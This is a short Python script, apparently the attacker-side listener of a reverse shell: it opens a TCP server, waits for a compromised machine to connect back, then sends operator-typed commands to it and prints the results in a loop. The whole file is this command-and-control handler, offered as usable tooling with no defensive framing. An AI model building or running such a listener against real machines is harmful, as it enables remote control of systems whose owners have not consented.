#!usr/bin/env python3
import socket
import sys

class Listener:
    def __init__(self, ip:str, port:int) -> None:    
        self.ip = ip 
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.ip,self.port))
        self.server.listen(0)
        print('[*] Server started and waiting for incoming connections.')

        self.connection, conn_addr = self.server.accept()
        print(f'[*] Incoming connection from {conn_addr}')


    def execute_remotely(self, command):
        self.connection.send(command)
        return self.connection.recv(1024).decode('utf-8')


    def run(self):
        while True:
            try:
                command = input('>> ').encode('utf-8')
                execution_result = self.execute_remotely(command)
                print(execution_result)

            except KeyboardInterrupt:
                print('[!] ctrl+c detected. Closing and exiting server/listener')
                self.server.close()
                sys.exit()

            except Exception as e:
                print('[-] Exception : ', e)